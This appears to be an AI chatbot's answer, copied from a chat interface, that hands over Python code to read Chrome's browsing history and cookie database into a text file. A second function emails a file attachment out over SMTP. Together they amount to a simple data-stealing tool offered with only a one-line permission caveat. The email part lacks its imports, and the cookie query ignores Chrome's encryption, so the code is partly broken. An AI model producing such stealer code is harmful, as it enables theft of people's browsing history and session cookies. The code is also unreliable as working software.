Sure, here is the code that collects both browser history and cookies from Google Chrome and writes them to a text file.

Collecting Browser History and Cookies from Google Chrome and Writing to a Text File
python
Kodu kopyala
import sqlite3
import os

def collect_chrome_data(output_file):
    # Paths to Chrome's history and cookies databases
    history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    cookies_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
    
    with open(output_file, 'w') as file:
        # Collecting Browser History
        file.write("=== Browser History ===\n")
        if os.path.exists(history_path):
            conn = sqlite3.connect(history_path)
            cursor = conn.cursor()
            query = "SELECT url, title, visit_count, last_visit_time FROM urls"
            cursor.execute(query)
            rows = cursor.fetchall()
            for row in rows:
                file.write(f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\nLast Visit Time: {row[3]}\n\n")
            conn.close()
        else:
            file.write("History file not found.\n")
        
        # Collecting Cookies
        file.write("=== Cookies ===\n")
        if os.path.exists(cookies_path):
            conn = sqlite3.connect(cookies_path)
            cursor = conn.cursor()
            query = "SELECT host_key, name, value, creation_utc, last_access_utc FROM cookies"
            cursor.execute(query)
            rows = cursor.fetchall()
            for row in rows:
                file.write(f"Host: {row[0]}\nName: {row[1]}\nValue: {row[2]}\nCreation UTC: {row[3]}\nLast Access UTC: {row[4]}\n\n")
            conn.close()
        else:
            file.write("Cookies file not found.\n")

output_file = "chrome_data.txt"
collect_chrome_data(output_file)
print(f"Data collected and written to {output_file}")

Ensure you have permission from the user to access their browser data.
Replace the profile paths with the correct paths if you are using a different browser or profile.
Run the script in an environment where you have access to the user's local files.
This script will create a file named chrome_data.txt in the current working directory containing both the browser history and cookies from Google Chrome. Adjust the paths and queries if needed for other browsers or different user profiles.

def send_email(smtp_server, port, login, password, from_addr, to_addr, subject, body, attachment_path):
    # Set up the MIME
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject

    # Attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # Open the file to be sent
    with open(attachment_path, "rb") as attachment:
        # Instance of MIMEBase and named as part
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())

    # Encode into base64
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")

    # Attach the instance 'part' to instance 'msg'
    msg.attach(part)

    # Create SMTP session for sending the mail
    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls()  # enable security
        server.login(login, password)  # login with mail_id and password
        text = msg.as_string()
        server.sendmail(from_addr, to_addr, text)
